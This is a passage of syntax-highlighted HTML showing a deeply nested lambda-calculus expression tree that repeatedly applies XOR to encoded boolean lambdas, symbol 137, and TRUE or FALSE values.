class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;TRUE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span class="hljs-symbol">&#x27;137</span>&#x27;]]]], <span class="hljs-symbol">&#x27;FALSE</span>&#x27;]]], [<span class="hljs-symbol">&#x27;call</span>&#x27;, [<span class="hljs-symbol">&#x27;call</span>&#x27;, <span class="hljs-symbol">&#x27;XOR</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;0</span>&#x27;, [<span class="hljs-symbol">&#x27;lambda</span>&#x27;, <span class="hljs-symbol">&#x27;1</span>&#x27;, [<span class="hljs-symbol">&#x27;symbol</span>&#x27;, <span 